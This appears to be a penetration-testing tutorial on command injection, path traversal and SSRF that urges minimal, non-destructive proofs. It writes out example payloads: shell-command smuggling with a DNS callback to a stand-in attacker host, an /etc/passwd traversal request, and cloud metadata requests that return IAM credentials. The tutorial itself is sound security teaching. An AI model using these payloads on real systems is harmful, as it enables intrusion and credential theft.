Injection and SSRF

Difficulty: Hard

The rest of the input-handling family follows one theme: user input reaching somewhere it should not — a shell, a file path, or an outbound request. Each has a gentle proof and a hard stop, so you demonstrate the flaw without detonating anything.

Command injection

When input reaches a system shell, you can run commands. Prove it with a harmless timing or DNS callback, never rm-anything: 

ping.php?host=8.8.8.8; sleep 5        # response takes 5s longer -> injection
ping.php?host=8.8.8.8; nslookup me.attacker-dns.test   # a DNS hit you control

A five-second delay, or a lookup arriving at a DNS server you own, proves execution without touching a single file.

Path traversal

When a filename comes from user input, ../ sequences can escape the intended directory and read files elsewhere: 

download?file=../../../../etc/passwd

root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin

Read one expected, harmless file to prove the escape works — then stop. You do not need to pull secrets to demonstrate the directory boundary is broken.

SSRF and cloud metadata

Server-Side Request Forgery makes the server fetch a URL you choose. The minimal proof is making it reach a listener you control and showing the inbound hit. In cloud environments the prize is the metadata endpoint, which hands out temporary IAM credentials to anything on the box: 

fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/
    -> role-name

fetch?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/role-name
    -> { "AccessKeyId": "ASIA...", "SecretAccessKey": "...", "Token": "..." }

Retrieving the role name (or a callback to your listener) is enough to prove SSRF. Do not take the credentials and pivot into the cloud account unless that is explicitly scoped — that crosses from proving a bug to breaking in.

Across all of these the discipline is the same: boolean diff over table dump, listener hit over cloud takeover, one file read over a directory sweep. The smallest convincing proof is both safer and more professional.

Decision tree — which sink, which safe proof

Same theme every time: follow the input to the dangerous sink, then use the smallest proof that sink allows: 

Untrusted input reaches a dangerous sink — which one?
│
├─ …a system shell  →  COMMAND INJECTION
│     → prove with timing (; sleep 5) or a DNS callback
│       never rm / destructive commands
│
├─ …a file path  →  PATH TRAVERSAL
│     → read ONE harmless expected file (../../etc/passwd)
│       then stop — don't sweep for secrets
│
└─ …an outbound request  →  SSRF
      → make it hit a listener you control (proof)
      → cloud? reach 169.254.169.254 metadata → role name
        stop at the role name; don't pivot with the creds
